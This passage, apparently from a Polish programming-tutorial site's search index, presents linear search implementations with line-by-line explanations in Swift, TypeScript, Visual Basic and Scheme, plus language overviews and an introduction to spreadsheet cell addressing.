(linearSearch `(8 2 9 10 5 4 2 7 18 0) 4 0))\n</code></pre>"},{"location":"programming/scheme/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: list\u0119 do przeszukania, warto\u015b\u0107 poszukiwanego elementu oraz numer obecnie sprawdzanego indeksu. Na pocz\u0105tku funkcji sprawdzamy, czy lista jest pusta (linia 3). Je\u017celi tak, to zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono w li\u015bcie i ko\u0144czymy dzia\u0142anie (linia 4). Jest to tzw. warunek stopu rekurencji. Je\u017celi na li\u015bcie pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element listy (pobrany za pomoc\u0105 funkcji <code>car</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 5). Je\u017celi tak, to zwracamy jako wynik warto\u015b\u0107 <code>index</code> zawieraj\u0105c\u0105 indeks aktualnie sprawdzanego elementu (linia 6). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linearSearch</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>cdr</code>), warto\u015b\u0107 poszukiwanego elementu oraz indeks zwi\u0119kszony o jeden.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z przygotowanymi parametrami i jej wynik wy\u015bwietlamy na ekranie za pomoc\u0105 funkcji <code>display</code> (linia 12).</p>"},{"location":"programming/swift/","title":"Swift","text":"<p>Swift jest nowoczesnym j\u0119zykiem programowania stworzonym przez Apple do tworzenia aplikacji na platformy iOS, macOS, watchOS i tvOS. Zosta\u0142 zaprojektowany, aby by\u0107 jak najbardziej przyjazny dla deweloper\u00f3w, oferuj\u0105c szybko\u015b\u0107 i wydajno\u015b\u0107 por\u00f3wnywaln\u0105 z C++, a jednocze\u015bnie prostot\u0119 i czytelno\u015b\u0107 kodu zbli\u017con\u0105 do Pythona.</p> <p> Swift</p>"},{"location":"programming/swift/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Czysta i czytelna sk\u0142adnia: Swift posiada minimalistyczn\u0105 i intuicyjn\u0105 sk\u0142adni\u0119, kt\u00f3ra jest \u0142atwa do nauczenia si\u0119 dla nowych programist\u00f3w.</p> </li> <li> <p>Bezpiecze\u0144stwo typ\u00f3w i zarz\u0105dzanie pami\u0119ci\u0105: Swift jest j\u0119zykiem o silnym typowaniu, kt\u00f3ry r\u00f3wnie\u017c zawiera zaawansowane funkcje zarz\u0105dzania pami\u0119ci\u0105, takie jak liczenie referencji (ARC).</p> </li> <li> <p>Wsparcie dla programowania funkcyjnego i obiektowego: Swift umo\u017cliwia programowanie zar\u00f3wno w paradygmacie obiektowym, jak i funkcyjnym, co daje programistom du\u017c\u0105 elastyczno\u015b\u0107.</p> </li> <li> <p>Integracja z ekosystemem Apple: Swift jest \u015bci\u015ble zintegrowany z ekosystemem Apple, w tym z Xcode, Cocoa Touch i innymi bibliotekami iOS/macOS.</p> </li> <li> <p>Interoperacyjno\u015b\u0107 z Objective-C: kod Swifta mo\u017cna \u0142atwo zintegrowa\u0107 z istniej\u0105cym kodem napisanym w Objective-C, co u\u0142atwia stopniowe przechodzenie na Swifta w du\u017cych projektach.</p> </li> <li> <p>Optymalizacja wydajno\u015bci: Swift zosta\u0142 zaprojektowany z my\u015bl\u0105 o wydajno\u015bci, oferuj\u0105c szybko\u015b\u0107 wykonania por\u00f3wnywaln\u0105 z j\u0119zykiem C++.</p> </li> </ol> <p>Od swojego wprowadzenia w 2014 roku, Swift sta\u0142 si\u0119 jednym z najszybciej rosn\u0105cych j\u0119zyk\u00f3w programowania i jest coraz cz\u0119\u015bciej wybierany przez deweloper\u00f3w aplikacji na urz\u0105dzenia Apple.</p>"},{"location":"programming/swift/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/swift/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Swift</p>"},{"location":"programming/swift/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/swift/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/swift/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/swift/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>func linearSearch(array: [Int], number: Int) -&gt; Bool {\n    for el in array {\n        if el == number {\n            return true\n        }\n    }\n\n    return false\n}\n\nlet array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nlet number = 7\n\nlet result = linearSearch(array: array, number: number)\n\nif result {\n    print(\"Liczba jest w tablicy\")\n} else {\n    print(\"Liczby nie ma w tablicy\")\n}\n</code></pre>"},{"location":"programming/swift/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy w tablicy (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jest to poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie elementy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/swift/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/swift/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>func linearSearch(array: [Int], number: Int) -&gt; Int {\n    for i in 0...array.count - 1 {\n        if array[i] == number {\n            return i\n        }\n    }\n\n    return -1\n}\n\nlet array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\nlet number = 7\n\nlet index = linearSearch(array: array, number: number)\n\nif index == -1 {\n    print(\"Liczby nie ma w tablicy\")\n} else {\n    print(\"Liczba jest pod indeksem \\(index)\")\n}\n</code></pre>"},{"location":"programming/swift/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 metody <code>count</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/swift/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/swift/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>func linearSearch(array: [Int], number: Int) {\n    for i in 0...array.count - 1 {\n        if array[i] == number {\n            print(i)\n        }\n    }\n}\n\nlet array = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8]\nlet number = 8\n\nprint(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\")\nlinearSearch(array: array, number: number)\n</code></pre>"},{"location":"programming/swift/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 metody <code>count</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/typescript/","title":"TypeScript","text":"<p>TypeScript jest j\u0119zykiem programowania stworzonym przez Microsoft, kt\u00f3ry stanowi nadzbi\u00f3r JavaScriptu. Jest zaprojektowany tak, aby pom\u00f3c programistom w \u0142atwiejszym pisaniu i zarz\u0105dzaniu du\u017cymi skomplikowanymi kodami, kt\u00f3re s\u0105 trudne do utrzymania w czystym JavaScript.</p> <p> TypeScript</p>"},{"location":"programming/typescript/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Bezpiecze\u0144stwo typ\u00f3w: TypeScript wprowadza system typ\u00f3w na poziomie kompilacji, co pomaga wykry\u0107 i zapobiec wielu powszechnym b\u0142\u0119dom podczas pisania kodu. System typ\u00f3w jest opcjonalny, co pozwala programistom stopniowo wprowadza\u0107 TypeScript do istniej\u0105cych projekt\u00f3w JavaScript.</p> </li> <li> <p>Nadzbi\u00f3r JavaScriptu: Ka\u017cdy kod JavaScript jest r\u00f3wnie\u017c poprawnym kodem TypeScript, co u\u0142atwia adopcj\u0119 TypeScript dla istniej\u0105cych programist\u00f3w JavaScript.</p> </li> <li> <p>Wsparcie dla nowoczesnych funkcji ES6/ES7: TypeScript obs\u0142uguje wiele nowoczesnych funkcji ECMAScript, takich jak klasy, modu\u0142y i strza\u0142kowe funkcje lambda. Kompilator TypeScript mo\u017ce przekszta\u0142ci\u0107 te funkcje do starszej wersji JavaScriptu dla kompatybilno\u015bci z przegl\u0105darkami.</p> </li> <li> <p>Narz\u0119dzia deweloperskie: TypeScript jest dobrze wspierany przez wiele popularnych \u015brodowisk IDE, takich jak Visual Studio Code, WebStorm i Atom, oferuj\u0105c funkcje takie jak automatyczne uzupe\u0142nianie kodu, nawigacja po kodzie \u017ar\u00f3d\u0142owym i refaktoryzacja.</p> </li> <li> <p>Wsparcie dla definicji typ\u00f3w z JavaScript: TypeScript wspiera pliki definicji typ\u00f3w, kt\u00f3re pozwalaj\u0105 programistom korzysta\u0107 z istniej\u0105cych bibliotek JavaScript z bezpiecze\u0144stwem typ\u00f3w.</p> </li> </ol> <p>TypeScript jest szeroko stosowany w przemy\u015ble IT, szczeg\u00f3lnie w du\u017cych projektach i aplikacjach front-endowych, takich jak Angular. Pomaga on zwi\u0119kszy\u0107 produktywno\u015b\u0107 programist\u00f3w poprzez zapewnienie silnych narz\u0119dzi do pisania, debugowania i refaktoryzacji kodu.</p>"},{"location":"programming/typescript/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka TypeScript</p>"},{"location":"programming/typescript/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/typescript/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/typescript/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/typescript/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>function linearSearch(array: number[], value: number): boolean {\n    for (let i: number = 0; i &lt; array.length; ++i) {\n        if (array[i] == value) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nlet array: number[] = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\nlet value: number = 7;\n\nlet result: boolean = linearSearch(array, value);\n\nif (result) {\n    console.log(\"Liczba jest w tablicy\");\n} else {\n    console.log(\"Liczby nie ma w tablicy\");\n}\n</code></pre>"},{"location":"programming/typescript/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/typescript/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/typescript/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>function linearSearch(array: number[], value: number): number {\n    for (let i: number = 0; i &lt; array.length; ++i) {\n        if (array[i] == value) {\n            return i;\n        }\n    }\n\n    return -1;\n}\n\nlet array: number[] = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\nlet value: number = 7;\n\nlet index: number = linearSearch(array, value);\n\nif (index == -1) {\n    console.log(\"Liczby nie ma w tablicy\");\n} else {\n    console.log(\"Liczba jest pod indeksem \", index);\n}\n</code></pre>"},{"location":"programming/typescript/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/typescript/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/typescript/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>function linearSearch(array: number[], value: number) {\n    for (let i: number = 0; i &lt; array.length; ++i) {\n        if (array[i] == value) {\n            console.log(i);\n        }\n    }\n}\n\nlet array: number[] = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8];\nlet value: number = 8;\n\nconsole.log(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\")\nlinearSearch(array, value);\n</code></pre>"},{"location":"programming/typescript/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 w\u0142asno\u015bci <code>length</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/visual-basic/","title":"Visual Basic","text":"<p>Visual Basic (VB) to j\u0119zyk programowania opracowany przez Microsoft. Jest cz\u0119\u015bci\u0105 rodziny j\u0119zyk\u00f3w .NET i jest znany ze swojej prostej sk\u0142adni, kt\u00f3ra jest bardzo podobna do j\u0119zyka angielskiego. To sprawia, \u017ce jest \u0142atwy do nauczenia si\u0119, szczeg\u00f3lnie dla pocz\u0105tkuj\u0105cych programist\u00f3w.</p>"},{"location":"programming/visual-basic/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>\u015arodowisko programistyczne: Visual Basic jest cz\u0119sto dostarczany z Visual Studio, zintegrowanym \u015brodowiskiem programistycznym (IDE) Microsoftu, kt\u00f3re umo\u017cliwia \u0142atwe projektowanie interfejs\u00f3w u\u017cytkownika poprzez przeci\u0105ganie i upuszczanie.</p> </li> <li> <p>Sk\u0142adnia podobna do angielskiego: sk\u0142adnia Visual Basic jest bardzo czytelna i \u0142atwa do zrozumienia, co sprawia, \u017ce jest to doskona\u0142y wyb\u00f3r dla pocz\u0105tkuj\u0105cych programist\u00f3w.</p> </li> <li> <p>W pe\u0142ni zorientowany obiektowo: Visual Basic jest w pe\u0142ni zorientowany obiektowo, co oznacza, \u017ce wspiera koncepcje takie jak dziedziczenie, enkapsulacja i polimorfizm.</p> </li> <li> <p>Wsparcie dla Windows Forms: Visual Basic jest szczeg\u00f3lnie popularny w\u015br\u00f3d programist\u00f3w tworz\u0105cych aplikacje Windows, poniewa\u017c wspiera Windows Forms, co umo\u017cliwia \u0142atwe tworzenie interfejs\u00f3w u\u017cytkownika.</p> </li> <li> <p>Integracja z bazami danych: Visual Basic oferuje silne wsparcie dla integracji z bazami danych, co czyni go popularnym wyborem dla programist\u00f3w tworz\u0105cych aplikacje biznesowe.</p> </li> </ol> <p>Visual Basic jest u\u017cywany w wielu r\u00f3\u017cnych obszarach, w tym do tworzenia aplikacji desktopowych, aplikacji internetowych, a tak\u017ce do tworzenia skrypt\u00f3w do automatyzacji zada\u0144 w programach Microsoft Office. Jednak\u017ce, jest mniej popularny w\u015br\u00f3d programist\u00f3w ni\u017c niekt\u00f3re inne j\u0119zyki, takie jak Python czy JavaScript, cz\u0119\u015bciowo z powodu swojego specyficznego skupienia na ekosystemie Microsoft.</p>"},{"location":"programming/visual-basic/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Visual Basic</p>"},{"location":"programming/visual-basic/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/visual-basic/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/visual-basic/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/visual-basic/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>Module Search\n    Public Function LinearSearch(array as Integer(), number as Integer) As Boolean\n        For Each el As Integer In array\n            If el = number Then\n                Return True\n            End If\n        Next\n\n        Return False\n    End Function\n\n    Sub Main()\n        Dim array as Integer() = {4, 8, 1, 3, 8, 0, 2, 5, 2}\n        Dim number as Integer = 0\n\n        Dim result as Boolean = LinearSearch(array, number)\n\n        If result Then\n            Console.WriteLine(\"Liczba jest w tablicy\")\n        Else\n            Console.WriteLine(\"Liczby nie ma w tablicy\")\n        End If\n    End Sub\nEnd Module\n</code></pre>"},{"location":"programming/visual-basic/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/visual-basic/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>Module Search\n    Public Function LinearSearch(array as Integer(), number as Integer) As Integer\n        For index As Integer = 0 To array.Length - 1\n            If array(index) = number Then\n                Return index\n            End If\n        Next\n\n        Return -1\n    End Function\n\n    Sub Main()\n        Dim array as Integer() = {4, 8, 1, 3, 8, 0, 2, 5, 2}\n        Dim number as Integer = 0\n\n        Dim index as Integer = LinearSearch(array, number)\n\n        If index = -1 Then\n            Console.WriteLine(\"Liczby nie ma w tablicy\")\n        Else\n            Console.WriteLine(\"Liczba jest w tablicy pod indeksem {0}\", index)\n        End If\n    End Sub\nEnd Module\n</code></pre>"},{"location":"programming/visual-basic/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/visual-basic/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>Module Search\n    Public Sub LinearSearch(array as Integer(), number as Integer)\n        For index As Integer = 0 To array.Length - 1\n            If array(index) = number Then\n                Console.WriteLine(index)\n            End If\n        Next\n    End Sub\n\n    Sub Main()\n        Dim array as Integer() = {4, 8, 1, 3, 8, 0, 2, 5, 8}\n        Dim number as Integer = 8\n\n        Console.WriteLine(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 szukana liczba:\")\n\n        LinearSearch(array, number)\n    End Sub\nEnd Module\n</code></pre>"},{"location":"spreadsheet/","title":"Wprowadzenie do arkusza kalkulacyjnego","text":"<p>Arkusze kalkulacyjne to pot\u0119\u017cne narz\u0119dzia wykorzystywane do organizacji, analizy i przechowywania danych w tabelarycznej formie. S\u0105 niezwykle popularne w r\u00f3\u017cnych dziedzinach - od edukacji po biznes - ze wzgl\u0119du na ich elastyczno\u015b\u0107 i wszechstronno\u015b\u0107.</p>"},{"location":"spreadsheet/#podstawowe-funkcje-arkusza-kalkulacyjnego","title":"Podstawowe funkcje arkusza kalkulacyjnego","text":"<ol> <li>Organizacja danych: pozwalaj\u0105 na efektywne zarz\u0105dzanie du\u017cymi ilo\u015bciami danych. Mo\u017cesz tworzy\u0107 tabele, kt\u00f3re pomog\u0105 w uporz\u0105dkowaniu i prezentacji informacji.</li> <li>Obliczenia: jedn\u0105 z kluczowych zalet arkuszy kalkulacyjnych jest ich zdolno\u015b\u0107 do wykonywania oblicze\u0144 matematycznych, od prostych dzia\u0142a\u0144, jak dodawanie i mno\u017cenie, po bardziej z\u0142o\u017cone formu\u0142y i funkcje.</li> <li>Analiza danych: arkusze kalkulacyjne oferuj\u0105 narz\u0119dzia do analizy danych, takie jak sortowanie, filtrowanie oraz tworzenie zaawansowanych wykres\u00f3w i tabel przestawnych.</li> <li>Automatyzacja: mo\u017cesz wykorzysta\u0107 formu\u0142y i makra do automatyzowania powtarzalnych zada\u0144, co znacznie zwi\u0119ksza efektywno\u015b\u0107 pracy.</li> </ol>"},{"location":"spreadsheet/#popularne-programy-arkusza-kalkulacyjnego","title":"Popularne programy arkusza kalkulacyjnego","text":"<ul> <li>Microsoft Excel: najbardziej znany i szeroko stosowany program do arkuszy kalkulacyjnych, oferuj\u0105cy zaawansowane funkcje i narz\u0119dzia.</li> <li>Google Sheets: darmowy arkusz kalkulacyjny w chmurze, kt\u00f3ry umo\u017cliwia wsp\u00f3\u0142prac\u0119 w czasie rzeczywistym.</li> <li>LibreOffice Calc: darmowa alternatywa dla Excela, kt\u00f3ra oferuje wiele podobnych funkcji.</li> </ul>"},{"location":"spreadsheet/#zastosowania-praktyczne","title":"Zastosowania praktyczne","text":"<ul> <li>Bud\u017cetowanie i finanse: arkusze kalkulacyjne s\u0105 idealne do \u015bledzenia wydatk\u00f3w, planowania bud\u017cet\u00f3w i analizy danych finansowych.</li> <li>Edukacja: u\u017cywane w szko\u0142ach i uczelniach do nauki informatyki, matematyki, statystyki i analizy danych.</li> <li>Zarz\u0105dzanie projektami: pomagaj\u0105 w planowaniu zada\u0144, \u015bledzeniu post\u0119p\u00f3w i zarz\u0105dzaniu zasobami.</li> </ul>"},{"location":"spreadsheet/#podsumowanie","title":"Podsumowanie","text":"<p>Arkusze kalkulacyjne s\u0105 niezb\u0119dnym narz\u0119dziem w nowoczesnym \u015bwiecie danych. Ich umiej\u0119tne wykorzystanie mo\u017ce znacznie poprawi\u0107 organizacj\u0119 pracy, efektywno\u015b\u0107 analizy danych i precyzj\u0119 oblicze\u0144. Niezale\u017cnie od tego, czy jeste\u015b studentem, profesjonalist\u0105 czy pasjonatem danych, nauka pracy z arkuszami kalkulacyjnymi otwiera drzwi do lepszego zarz\u0105dzania i interpretacji informacji.</p>"},{"location":"spreadsheet/addressing/","title":"Adresowanie kom\u00f3rek w arkuszu kalkulacyjnym","text":"<p>W arkuszu kalkulacyjnym ka\u017cda kom\u00f3rka jest unikalnie identyfikowana przez jej adres, kt\u00f3ry sk\u0142ada si\u0119 z oznaczenia kolumny (liter) i numeru wiersza. Na przyk\u0142ad, kom\u00f3rka w pierwszej kolumnie i pierwszym wierszu b\u0119dzie mia\u0142a adres A1.</p>"},{"location":"spreadsheet/addressing/#typy-adresowania","title":"Typy Adresowania","text":"<ol> <li>Adresowanie wzgl\u0119dne:</li> <li>W adresowaniu wzgl\u0119dnym, adres kom\u00f3rki zmienia si\u0119, gdy formu\u0142a jest kopiowana lub przenoszona do innej kom\u00f3rki.</li> <li> <p>Przyk\u0142ad: Je\u015bli masz formu\u0142\u0119 <code>=A1+1</code> w kom\u00f3rce B1 i skopiujesz j\u0105 do B2, formu\u0142a zmieni si\u0119 na <code>=A2+1</code>.</p> </li> <li> <p>Adresowanie bezpo\u015brednie:</p> </li> <li>W adresowaniu bezpo\u015brednim, adres kom\u00f3rki pozostaje niezmienny, niezale\u017cnie od tego, gdzie formu\u0142a jest kopiowana.</li> <li>To osi\u0105ga si\u0119 przez dodanie znaku dolara ($) przed liter\u0105 kolumny i/lub numerem wiersza. Na przyk\u0142ad: <code>$A$1</code>.</li> <li> <p>Przyk\u0142ad: Je\u015bli masz formu\u0142\u0119 <code>=$A$1+1</code> w kom\u00f3rce B1 i skopiujesz j\u0105 do B2, formu\u0142a pozostanie <code>=$A$1+1</code>.</p> </li> <li> <p>Mieszane adresowanie:</p> </li> <li>Kombinuje adresowanie wzgl\u0119dne i bezpo\u015brednie, gdzie albo kolumna, albo wiersz jest zakotwiczony.</li> <li>Przyk\u0142ady: <code>$A1</code> (kolumna A jest zakotwiczona) lub <code>A$1</code> (wiersz 1 jest zakotwiczony).</li> </ol>"},{"location":"spreadsheet/addressing/#zakotwiczanie-wierszy-i-kolumn","title":"Zakotwiczanie wierszy i kolumn","text":"<p>Zakotwiczanie jest u\u017cywane, gdy potrzebujesz odwo\u0142a\u0107 si\u0119 do 